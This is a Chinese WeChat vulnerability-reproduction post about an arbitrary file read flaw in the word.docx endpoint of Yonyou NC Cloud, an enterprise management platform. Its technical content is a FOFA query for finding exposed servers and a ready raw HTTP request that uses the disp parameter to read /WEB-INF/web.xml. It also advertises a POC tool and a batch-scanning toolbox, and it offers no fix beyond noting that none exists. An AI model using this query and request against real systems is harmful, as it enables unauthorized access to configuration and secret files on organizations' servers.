#  用友NC word.docx接口存在任意文件读取漏洞 附POC   
原创 南风徐来  南风漏洞复现文库   2023-11-25 22:36  
  
@[toc]  
# 用友NC word.docx接口存在任意文件读取漏洞 附POC  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 用友NC 简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
用友 NC Cloud，大型企业数字化平台， 聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现 人、财、物、客的全面数字化，从而驱动业务创新与管理变革，与企业管理者一起重新定义未来的高度。为客户提供面向大型企业集团、制造业、消费品、建筑、房地产、金融保险等14个行业大类，68个细分行业，涵盖数字营销、智能制造、财务共享、数字采购等18大解决方案，帮助企业全面落地数字化。  
  
用友网络是全球领先的企业与公共组织软件、云服务、金融服务提供商。提供营销、制造、财务、人力等产品与服务，帮助客户实现发展目标，进而推动商业和社会进步。  
## 2.漏洞描述  
  
用友 NC Cloud，大型企业数字化平台， 聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现 人、财、物、客的全面数字化，从而驱动业务创新与管理变革，与企业管理者一起重新定义未来的高度。为客户提供面向大型企业集团、制造业、消费品、建筑、房地产、金融保险等14个行业大类，68个细分行业，涵盖数字营销、智能制造、财务共享、数字采购等18大解决方案，帮助企业全面落地数字化。用友NC Cloud word.docx接口存在任意文件读取漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
用友NC Cloud  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3adbAtv437c8pYANkzQmQdt7LrK8yQL7sIHfX41Mu7zEDobf9RsVu3IUj5ydg3Rh10USdj08oMp8Q/640?wx_fmt=jpeg&from=appmsg "null")  
  
用友NC word.docx接口存在任意文件读取漏洞  
## 4.fofa查询语句  
  
body="UClient.dmg"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/portal/docctr/open/word.docx?disp=/WEB-INF/web.xml  
  
漏洞数据包：  
```
GET /portal/docctr/open/word.docx?disp=/WEB-INF/web.xml HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3adbAtv437c8pYANkzQmQdtGPudeZdupIWYrnwwiclaUWRURIM4CKH8r9KiahtPpNxs53zKJxIFSpRg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3adbAtv437c8pYANkzQmQdtxOwsFrmKibafsM6ad1VmM7GicJSv8h4X99Uhs204HU9OeeDybbOYX8ew/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现84 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3adbAtv437c8pYANkzQmQdt3WatEEicJuasDTiae5fXb8okdgicPcY1Uo6emjaZnWUqaoMEBL41JvcIw/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3adbAtv437c8pYANkzQmQdt4SqPnQVhQ8Ajroiavq1dGVWwzIOMEq2IoBfeksM5THTMV0F8MVxKr7g/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3adbAtv437c8pYANkzQmQdt95SyZia80acYibOibO3lf517ONibib8QvDzjQEabunRTBsYjPOIIh0cyP6Q/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3adbAtv437c8pYANkzQmQdtRvLre3iaF7sK8jZyuUaZWTXrH0gXS2D60pcumez5203GsvvytRDFgNw/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
厂商尚未提供漏洞修复方案，请关注厂商主页更新： https://www.yonyou.com/  
## 8.往期回顾  
  
[亿赛通电子文档安全管理系统UploadFileFromClientServiceForClient接口存在任意文件上传漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484633&idx=1&sn=564b1d5a595d7361fd8bdc358266e647&chksm=974b89dea03c00c83d2194779fdf96bd3a770825c66316a4ddfdbf1a16869543cd3ccef6fb1f&scene=21#wechat_redirect)  
  
  
[鸿运主动安全监控云平台存在任意文件读取漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484618&idx=1&sn=d6afb834049f84a076ae1e3ce9acbfeb&chksm=974b89cda03c00db68ac96ec70e3b01776af8c3e93a4291da32bcfe22393e8b993a9abe87007&scene=21#wechat_redirect)  
  
  
  
  
